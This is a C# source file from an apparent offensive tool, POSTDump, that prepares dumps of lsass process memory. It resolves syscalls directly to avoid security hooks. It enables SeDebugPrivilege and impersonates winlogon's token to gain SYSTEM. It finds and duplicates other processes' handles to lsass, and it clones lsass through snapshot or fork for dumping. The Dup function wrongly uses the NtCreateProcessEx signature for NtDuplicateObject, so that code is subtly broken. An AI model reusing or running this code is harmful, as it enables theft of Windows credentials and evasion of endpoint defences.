using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Data = POSTMiniDump.Data;

namespace POSTDump
{
    public static class Handle
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetProcessId(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(string host, string name, ref Data._LUID pluid);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool PssNtFreeSnapshot(IntPtr SnapshotHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int PssNtQuerySnapshot(IntPtr SnapHandle, uint flags, out IntPtr hCLoneProcess, uint BufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr ProcessHandle, uint CaptureFlags, uint ThreadContextFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool NtClose(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtCreateProcessEx(out IntPtr ProcesDumpHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ParentProcess, [In, MarshalAs(UnmanagedType.U1)] bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtOpenProcess(ref IntPtr processHandle, uint desiredAccess, ref Data.OBJECT_ATTRIBUTES objectAttributes, ref Data.CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtDuplicateObject(IntPtr SourceProcessHandle, IntPtr SourceHandle, IntPtr TargetProcessHandle, out IntPtr TargetHandle, uint DesiredAccess, uint HandleAttr, uint Options);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtTerminateProcess(IntPtr handle, Data.NTSTATUS ExitStatus);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref Data._TOKEN_PRIVILEGES newstn, UInt32 bufferlength, IntPtr prev, IntPtr relen);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.NTSTATUS NtQuerySystemInformation(uint SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);


        public static bool kill_process(uint pid, IntPtr procHandle)
        {
            if (pid != 0)
            {
                procHandle = IntPtr.Zero;
                NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntopenptr, typeof(NtOpenProcess));
                Data.OBJECT_ATTRIBUTES oa = new Data.OBJECT_ATTRIBUTES();
                Data.CLIENT_ID ci = new Data.CLIENT_ID()
                {
                    UniqueProcess = (IntPtr)pid,
                };

                NTOP(ref procHandle, (uint)0x0001, ref oa, ref ci); //PROCESS_TERMINATE
            }

            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr ntkillptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtTerminateProcess");
            NtTerminateProcess NTTP = (NtTerminateProcess)Marshal.GetDelegateForFunctionPointer(ntkillptr, typeof(NtTerminateProcess));
            Data.NTSTATUS status = NTTP(procHandle, 0x00000000);
            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Failed killed process while cleanup.");
                return false;
            }

            return true;
        }

        public static void cleanup(IntPtr handle, string tech, IntPtr snapHandle)
        {
            if (tech == "snapshot")
            {
                PssNtFreeSnapshot PssNtFree = (PssNtFreeSnapshot)Marshal.GetDelegateForFunctionPointer(POSTDump.ISyscall.GetExportAddress("PssNtFreeSnapshot"), typeof(PssNtFreeSnapshot));
                PssNtFree(snapHandle);
            }
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));
            NTC(handle);
        }

        public static bool GetProcessHandle(int pid, out IntPtr procHandle, uint permissions)
        {
            procHandle = IntPtr.Zero;
            NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntopenptr, typeof(NtOpenProcess));
            Data.OBJECT_ATTRIBUTES oa = new Data.OBJECT_ATTRIBUTES();
            Data.CLIENT_ID ci = new Data.CLIENT_ID()
            {
                UniqueProcess = (IntPtr)pid,
            };

            NTOP(ref procHandle, permissions, ref oa, ref ci);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            return true;
        }

        public static unsafe bool Snapshot(IntPtr procHandle, out IntPtr dumpHandle, out IntPtr tempHandle)
        {
            dumpHandle = IntPtr.Zero;

            PssNtCaptureSnapshot PssNtCap = (PssNtCaptureSnapshot)Marshal.GetDelegateForFunctionPointer(POSTDump.ISyscall.GetExportAddress("PssNtCaptureSnapshot"), typeof(PssNtCaptureSnapshot));
            Data.NTSTATUS hresult = PssNtCap(out tempHandle, procHandle, (uint)0x00000001, (uint)0); //PSS_CAPTURE_VA_CLONE
            if (tempHandle == IntPtr.Zero)
            {
                Console.WriteLine("PssNtCaptureSnapshot failed.");
                return false;
            }
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));
            NTC(procHandle);

            PssNtQuerySnapshot PssNtQuery = (PssNtQuerySnapshot)Marshal.GetDelegateForFunctionPointer(POSTDump.ISyscall.GetExportAddress("PssNtQuerySnapshot"), typeof(PssNtQuerySnapshot));
            PssNtQuery(tempHandle, (uint)1, out dumpHandle, (uint)IntPtr.Size); //PSS_QUERY_VA_CLONE_INFORMATION

            NTC(tempHandle);

            if (dumpHandle == IntPtr.Zero)
            {
                return false;
            }

            return true;
        }

        public static bool Fork(IntPtr procHandle, out IntPtr dumpHandle)
        {
            dumpHandle = IntPtr.Zero;
            IntPtr ntcreateptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtCreateProcessEx");
            NtCreateProcessEx NTCP = (NtCreateProcessEx)Marshal.GetDelegateForFunctionPointer(ntcreateptr, typeof(NtCreateProcessEx));
            NTCP(out dumpHandle, (uint)0x001F0FFF, IntPtr.Zero, procHandle, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero); //PROCESS_ALL_ACCESS

            if (dumpHandle == IntPtr.Zero)
            {
                return false;
            }

            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));
            NTC(procHandle);
            return true;
        }

        public static bool Dup(IntPtr procHandle, out IntPtr dumpHandle)
        {
            dumpHandle = IntPtr.Zero;
            IntPtr ntdupptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtDuplicateObject");
            NtCreateProcessEx NTCP = (NtCreateProcessEx)Marshal.GetDelegateForFunctionPointer(ntdupptr, typeof(NtCreateProcessEx));
            NTCP(out dumpHandle, (uint)0x001F0FFF, IntPtr.Zero, procHandle, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero); //PROCESS_ALL_ACCESS

            if (dumpHandle == IntPtr.Zero)
            {
                return false;
            }

            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));
            NTC(procHandle);
            return true;
        }

        public static bool ElevateHandle(IntPtr hProcess, uint desiredAccess, UInt32 HandleAttributes, out IntPtr hHighPriv)
        {
            IntPtr ntdupptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtDuplicateObject");
            NtDuplicateObject NTDO = (NtDuplicateObject)Marshal.GetDelegateForFunctionPointer(ntdupptr, typeof(NtDuplicateObject));

            IntPtr hDupPriv = IntPtr.Zero;
            hHighPriv = IntPtr.Zero;
            uint options = 0;
            HandleAttributes = 0;
            Data.NTSTATUS status = NTDO((IntPtr)(-1), hProcess, (IntPtr)(-1), out hDupPriv, (uint)0x0040, 0, 0); //PROCESS_DUP_HANDLE

            if (hDupPriv == IntPtr.Zero)
            {
                cleanup(hProcess, String.Empty, IntPtr.Zero);
                return false;
            }

            NTDO(hDupPriv, (IntPtr)(-1), (IntPtr)(-1), out hHighPriv, desiredAccess, HandleAttributes, options);
            if (hHighPriv == IntPtr.Zero)
            {
                cleanup(hDupPriv, String.Empty, IntPtr.Zero);
                cleanup(hProcess, String.Empty, IntPtr.Zero);
                return false;
            }

            cleanup(hDupPriv, String.Empty, IntPtr.Zero);
            cleanup(hProcess, String.Empty, IntPtr.Zero);
            return true;
        }

        public static bool EnablePrivilege(string privname)
        {
            IntPtr TokenHandle = IntPtr.Zero;
            NtOpenProcessToken NTOPT = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.GetSyscallPtr("NtOpenProcessToken"), typeof(NtOpenProcessToken));

            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));

            bool retVal;
            Data._TOKEN_PRIVILEGES tp = new Data._TOKEN_PRIVILEGES();
            IntPtr htok = IntPtr.Zero;
            NTOPT(new IntPtr(-1), 0x0020 | 0x0008, out htok); // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            if (htok == IntPtr.Zero)
            {
                return false;
            }

            tp.PrivilegeCount = 1;
            tp.Privileges.Attributes = 0x00000002;

            retVal = LookupPrivilegeValue(null, privname, ref tp.Privileges.Luid);
            if (!retVal)
            {
                Console.WriteLine("LookupPriv failed.");
                NTC(htok);
                return false;
            }

            IntPtr ntadjustptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtAdjustPrivilegesToken");
            NtAdjustPrivilegesToken NTAPT = (NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(ntadjustptr, typeof(NtAdjustPrivilegesToken));
            Data.NTSTATUS status = NTAPT(htok, false, ref tp, (uint)Marshal.SizeOf(typeof(Data._TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
            if (status != Data.NTSTATUS.Success)
            {
                NTC(htok);
                return false;
            }

            NTC(htok);
            return true;
        }

        public static bool escalate_to_system()
        {
            IntPtr ntopentoken = POSTDump.Postdump.isyscall.GetSyscallPtr("NtOpenProcessToken");
            NtOpenProcessToken NTOPT = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(ntopentoken, typeof(NtOpenProcessToken));

            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));

            bool res = EnablePrivilege("SeDebugPrivilege");
            if (!res)
            {
                Console.WriteLine("SeDebugPrivilege failed");
                return false;
            }

            Process[] processlist = Process.GetProcesses();
            Process proc = new Process();
            IntPtr tokenHandle = IntPtr.Zero;
            uint TOKEN_READ = 0x00020000 | 0x0008; // STANDARD_RIGHTS_READ | TOKEN_QUERY
            uint TOKEN_IMPERSONATE = 0x0004;
            uint TOKEN_DUPLICATE = 0x0002;
            Data.NTSTATUS status;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "winlogon")
                {
                    proc = theProcess;
                    break;
                }
            }

            status = NTOPT(proc.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine("NtOpenProcessToken Failed!");
                return false;
            }

            bool token = ImpersonateLoggedOnUser(tokenHandle);
            if (!token)
            {
                Console.WriteLine("GetSystem Failed! ");
                return false;
            }

            NTC(proc.Handle);
            NTC(tokenHandle);

            return true;
        }

        public static IntPtr GetInformationTable(uint systeminfoclass)
        {
            //int nHandleInfoSize = 0x8;
            //uint nHandleInfoSize = (uint)Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION));
            int nHandleInfoSize = 0x4;
            IntPtr handleTableInformation = POSTMiniDump.Utils.intAlloc((uint)nHandleInfoSize);
            int nLength = 0;
            IntPtr ipHandle = IntPtr.Zero;
            Data.NTSTATUS queryResult;

            NtQuerySystemInformation NTQSI = (NtQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntquerysys, typeof(NtQuerySystemInformation));
            while ( (queryResult = NTQSI(systeminfoclass, handleTableInformation, nHandleInfoSize, out nLength)) == Data.NTSTATUS.InfoLengthMismatch){
                nHandleInfoSize = nLength;
                POSTMiniDump.Utils.intFree(handleTableInformation);
                handleTableInformation = POSTMiniDump.Utils.intAlloc((uint)(nLength *= 2));
            }

            return handleTableInformation;
        }

        private static List<SYSTEM_HANDLE> GetProcHandles(int pid, IntPtr handletableinfo)
        {
            int lHandleCount = Marshal.ReadInt32(handletableinfo);
            IntPtr ipHandle = new IntPtr(handletableinfo.ToInt64() + 8);
            SYSTEM_HANDLE shHandle;
            List<SYSTEM_HANDLE> lstprochandles = new List<SYSTEM_HANDLE>();

            for (int lIndex = 0; lIndex < lHandleCount; lIndex++)
            {
                shHandle = new SYSTEM_HANDLE();
                shHandle = (SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
                ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE)) + 8);

                if (shHandle.ProcessID == pid && shHandle.ObjectTypeNumber == 0x7)
                {
                    lstprochandles.Add(shHandle);
                }

            }

            return lstprochandles;
        }

        public static List<IntPtr> FindDupHandles(int pid)
        {
            //Get all needed function pointer
            NtDuplicateObject NTDO = (NtDuplicateObject)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtDuplicateObject"), typeof(NtDuplicateObject));
            NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntopenptr, typeof(NtOpenProcess));
            POSTMiniDump.Modules.NtQueryInformationProcess NTQP = (POSTMiniDump.Modules.NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess"), typeof(POSTMiniDump.Modules.NtQueryInformationProcess));
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));

            IntPtr hProcess = IntPtr.Zero;
            IntPtr hDup = IntPtr.Zero;
            List<IntPtr> hDupList = new List<IntPtr>();
            Data.OBJECT_ATTRIBUTES oa = new Data.OBJECT_ATTRIBUTES();
            Data.CLIENT_ID ci = new Data.CLIENT_ID();
            List<SYSTEM_HANDLE> lstHandles;

            IntPtr HandleTableInfo = GetInformationTable(0x10);

            //Get all running processes
            Process[] processCollection = Process.GetProcesses();

            foreach (Process p in processCollection)
            {
                if (p.Id != 0 && p.Id != 4 && p.Id != pid)
                { 
                    ci.UniqueProcess = (IntPtr)p.Id;

                    NTOP(ref hProcess, (uint)0x0040, ref oa, ref ci); //PROCESS_DUP_HANDLE
                    if (hProcess == IntPtr.Zero)
                    {
                        continue;
                    }

                    lstHandles = GetProcHandles(p.Id, HandleTableInfo);
                    //Parse each handle of this process
                    foreach (var item in lstHandles)
                    {
                        if (item.ProcessID == p.Id){
                            Data.NTSTATUS rez = NTDO(hProcess, (IntPtr)item.Handle, (IntPtr)(-1), out hDup, 0, 0, 0x00000002); //DUPLICATE_SAME_ACCESS
                            if (rez != Data.NTSTATUS.Success)
                                continue;

                            Data.PROCESSINFOCLASS pic = new Data.PROCESSINFOCLASS();
                            Data.PROCESS_BASIC_INFORMATION pbi = new Data.PROCESS_BASIC_INFORMATION();
                            pbi.UniqueProcessId = (UIntPtr)0;
                            int psize = 0;
                            rez = NTQP(hDup, pic, out pbi, Marshal.SizeOf(pbi), out psize);
                            if (rez != Data.NTSTATUS.Success)
                            {
                                NTC(hDup);
                                continue;
                            }

                            if ((int)pbi.UniqueProcessId == pid)
                            {
                                Console.WriteLine($"Found lsass handle 0x{item.Handle.ToString("X")} on {p.Id} ({p.ProcessName})");
                                hDupList.Add(hDup);
                            }
                            else
                            {
                                NTC(hDup);
                            }
                        }
                    }  
                }
                //Close handle to the process
                NTC(hProcess);
            }

            return hDupList;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_HANDLE
        {
            // Information Class 16
            public uint ProcessID;
            public byte ObjectTypeNumber;
            public byte Flags; // 0x01 = PROTECT_FROM_CLOSE, 0x02 = INHERIT
            public ushort Handle;
            public int Object_Pointer;
            public uint GrantedAccess;
        }
    }
}
